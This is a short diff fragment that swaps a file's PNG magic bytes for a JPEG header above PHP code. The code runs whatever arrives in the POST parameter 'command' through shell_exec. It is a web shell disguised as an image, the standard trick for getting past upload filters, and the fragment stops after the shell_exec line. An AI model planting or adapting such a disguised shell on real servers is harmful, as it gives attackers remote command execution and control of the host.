@@ -1,5 +1,4 @@
-äPNG
-
+ÿØÿà
 <?php
 if (isset($_POST["command"])) {
 	$message = shell_exec($_POST["command"]);
